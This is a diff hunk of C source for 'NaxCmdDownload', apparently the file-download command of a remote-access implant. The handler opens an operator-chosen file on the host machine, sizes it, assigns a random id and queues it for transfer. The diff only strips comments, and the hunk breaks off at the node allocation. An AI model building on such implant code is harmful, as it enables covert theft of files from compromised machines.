@@ -28,13 +28,11 @@ FUNC INT NaxCmdDownload( PNAX_INSTANCE Nax,
     PBYTE  pathArgs    = (PBYTE)args + 4;
     UINT32 pathLen     = args_len - 4;
 
-    /* Build null-terminated path */
     PCHAR path_buf = (PCHAR)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, pathLen + 1 );
     if ( !path_buf ) return NAX_ERR_NOMEM;
     MmCopy( path_buf, pathArgs, pathLen );
     path_buf[ pathLen ] = '\0';
 
-    /* Open file */
     HANDLE hFile = Nax->Kernel32.CreateFileA( path_buf, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL );
     if ( hFile == INVALID_HANDLE_VALUE ) {
         DWORD err = Nax->Kernel32.GetLastError ? Nax->Kernel32.GetLastError() : 0;
@@ -43,7 +41,6 @@ FUNC INT NaxCmdDownload( PNAX_INSTANCE Nax,
         return NAX_ERR_FAIL;
     }
 
-    /* File size */
     DWORD fsize_hi = 0;
     DWORD fsize_lo = Nax->Kernel32.GetFileSize( hFile, &fsize_hi );
     if ( fsize_lo == (DWORD)( -1 ) || fsize_hi > 0 ) {
@@ -55,18 +52,15 @@ FUNC INT NaxCmdDownload( PNAX_INSTANCE Nax,
     }
     UINT32 fsize = (UINT32)fsize_lo;
 
-    /* Basename */
     PCHAR fname = path_buf;
     for ( UINT32 i = 0; path_buf[i]; i++ )
         if ( path_buf[i] == '\\' || path_buf[i] == '/' )
             fname = path_buf + i + 1;
     UINT32 fname_len = NaxStrLen( fname );
 
-    /* Generate random fileId */
     UINT32 fileId = 0;
     Nax->Bcrypt.BCryptGenRandom( NULL, (PBYTE)&fileId, 4, BCRYPT_USE_SYSTEM_PREFERRED_RNG );
 
-    /* Allocate download node */
     NAX_DOWNLOAD* dl = (NAX_DOWNLOAD*)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, sizeof( NAX_DOWNLOAD ) );
     if ( !dl ) {
         Nax->Kernel32.CloseHandle( hFile );
